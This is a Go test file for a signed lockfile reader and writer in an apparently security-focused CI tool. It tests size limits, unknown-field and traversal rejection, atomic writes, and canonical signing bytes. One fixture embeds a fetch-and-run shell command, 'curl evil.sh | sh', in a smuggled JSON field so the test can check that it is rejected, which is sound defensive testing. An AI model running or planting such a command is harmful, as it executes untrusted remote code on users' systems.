package manifest

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Every input is untrusted. os.ReadFile on an attacker-supplied lockfile with
// no ceiling is an out-of-memory kill waiting to happen.
func TestReadLockfile_RejectsOversizedFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "scg.lock")

	big := make([]byte, MaxLockfileBytes+1)
	for i := range big {
		big[i] = ' '
	}
	copy(big, []byte(`{"version":1,"pipelines":[]}`))
	if err := os.WriteFile(path, big, 0o644); err != nil {
		t.Fatal(err)
	}

	if _, err := ReadLockfile(path); err == nil {
		t.Fatal("an oversized lockfile must be rejected")
	} else if !strings.Contains(err.Error(), "too large") {
		t.Errorf("error should say the file is too large, got: %v", err)
	}
}

// Verification re-marshals the parsed struct, so any content that does not map
// to a struct field never reaches the signature check. Rejecting unknown fields
// closes that channel: nothing can be in the file that the signature did not
// cover.
func TestReadLockfile_RejectsUnknownFields(t *testing.T) {
	path := filepath.Join(t.TempDir(), "scg.lock")
	payload := `{"version":1,"pipelines":[],"smuggled":{"exec":"curl evil.sh | sh"}}`
	if err := os.WriteFile(path, []byte(payload), 0o644); err != nil {
		t.Fatal(err)
	}

	if _, err := ReadLockfile(path); err == nil {
		t.Fatal("a lockfile with fields outside the schema must be rejected")
	}
}

func TestReadLockfile_RejectsUnsupportedVersion(t *testing.T) {
	path := filepath.Join(t.TempDir(), "scg.lock")
	if err := os.WriteFile(path, []byte(`{"version":99,"pipelines":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := ReadLockfile(path); err == nil {
		t.Fatal("an unsupported lockfile version must be rejected")
	}
}

// A lockfile is a security artifact. A write interrupted halfway leaves a
// truncated file that fails to parse, and in CI that reads as a broken repo
// rather than a broken write.
func TestWriteLockfile_IsAtomic(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "scg.lock")

	lf := &Lockfile{Version: 1, Pipelines: []PipelineEntry{}}
	if err := WriteLockfile(path, lf); err != nil {
		t.Fatal(err)
	}

	// No temporary files may survive a successful write.
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if e.Name() != "scg.lock" {
			t.Errorf("write left a stray file behind: %s", e.Name())
		}
	}

	got, err := ReadLockfile(path)
	if err != nil {
		t.Fatalf("written lockfile must read back: %v", err)
	}
	if got.Version != 1 {
		t.Errorf("Version = %d, want 1", got.Version)
	}
}

func TestWriteLockfile_RejectsTraversalPaths(t *testing.T) {
	lf := &Lockfile{Version: 1}
	for _, p := range []string{"../../etc/scg.lock", "a/../../b/scg.lock"} {
		if err := WriteLockfile(p, lf); err == nil {
			t.Errorf("WriteLockfile(%q) must be rejected", p)
		}
	}
}

// An absolute path is the operator's explicit choice via --lockfile, not
// something untrusted input can smuggle in. Rejecting it breaks a legitimate
// flag for no security gain.
func TestWriteLockfile_AllowsExplicitAbsolutePath(t *testing.T) {
	path := filepath.Join(t.TempDir(), "scg.lock")
	if err := WriteLockfile(path, &Lockfile{Version: 1}); err != nil {
		t.Errorf("an absolute --lockfile path must be honoured: %v", err)
	}
}

// A legitimate path that merely contains dots must still work — the old
// substring check rejected these.
func TestWriteLockfile_AllowsDottedDirectoryNames(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "my..dir", "scg.lock")
	if err := WriteLockfile(path, &Lockfile{Version: 1}); err != nil {
		t.Errorf("a dotted directory name is not traversal: %v", err)
	}
}

// canonicalJSON must be the only thing that produces signing bytes. If a second
// code path marshals its own copy, the two silently diverge on the next schema
// change and every platform-signed lockfile in the field stops verifying.
func TestCanonicalJSON_MatchesPlainMarshalWithoutSignature(t *testing.T) {
	lf := &Lockfile{
		Version:   1,
		Pipelines: []PipelineEntry{{Path: "ci.yml", Type: "github_actions"}},
		Signature: &Signature{Algorithm: "ed25519-platform", Value: "x", PublicKey: "y"},
	}

	got, err := CanonicalJSON(lf)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(got), "signature") {
		t.Error("canonical form must exclude the signature block")
	}

	stripped := *lf
	stripped.Signature = nil
	want, err := json.Marshal(stripped)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != string(want) {
		t.Errorf("canonical form drifted:\n got: %s\nwant: %s", got, want)
	}
}
